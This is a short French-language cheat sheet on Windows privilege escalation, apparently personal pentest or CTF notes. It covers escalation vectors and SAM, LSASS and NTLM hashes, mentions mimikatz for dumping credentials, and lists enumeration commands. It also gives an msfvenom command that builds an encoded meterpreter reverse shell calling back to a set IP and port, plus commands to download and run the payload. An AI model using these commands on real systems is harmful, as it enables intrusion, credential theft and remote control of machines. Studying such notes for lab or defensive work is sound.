---
title: "Windows Privilege Escalation"
---

<p style="text-align: right">_- last update 07/11/2021 -_</p>

## Concepts

Types de comptes classique sur un serveur windows:

* Domain Administrators
* Services (utilisé par les logiciels, compte de service)
* Domain users
* Local accounts

Vecteurs d'escalade de privilège communs :

* Stored Credentials (stockage d'applications, fichers de configuration, ...)
* Windows Kernel Exploit
* Insecure File/Folder Permissions
* Insecure Service Permissions
* DLL Hijacking
* Unquoted Service Path
* AlwaysInstallElevated policy (installation de MSI custom)
* Other software

**SAM (Security Accounts Manager)**: base de donnée qui stock les données
sensibles du système dans windows (mdp, hash, ...).

Il existe deux type de hash pour authentifier les utilisateurs:

* **LM (LAN Manager)**: vieux, vulnérable au brute-force
* **NTLM (NT LAN Manager)**: moderne, plus solide

**LSASS (Local Security Authority Subsystem Service)**: processus qui communique
avec le **SAM** pour y comparer les hash / récupérer les mdp.

LSASS stocke temporairement en cache les mdp en claire pour faire une forme de
SSO sur la machine.

On peut utiliser [mimikatz](https://github.com/gentilkiwi/mimikatz) pour dump
les données de la SAM et ensuite les casser avec john !

Il est assez courant de pouvoir remplacer des exe ou d'habuser de chemins
windows. Par exemple voir si on peut renommer des exe qui sont executés
periodiquement par **WindowsScheduler**.

## Enumeration

Voir [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

Liste les utilisateurs:

```cmd
net users
```

Liste les infos sensible du système pour chercher des vulnérabilités publiques:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Liste les services:

```cmd
wmic service list
```

## Useful commands

Pour download un fichier

```bash
powershell -c "Invoke-WebRequest -Uri '...' -Outfile '...'"
```

Pour générer un payload reverse shell :

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.13.134 LPORT=4444 -f exe -o shellexe
```

Pour executer un payload

```bash
powershell -c "Star-Process 'myreverseshell.exe'"
```

## Useful CVES

* [InstallerFileTakeOver](https://github.com/klinix5/InstallerFileTakeOver)
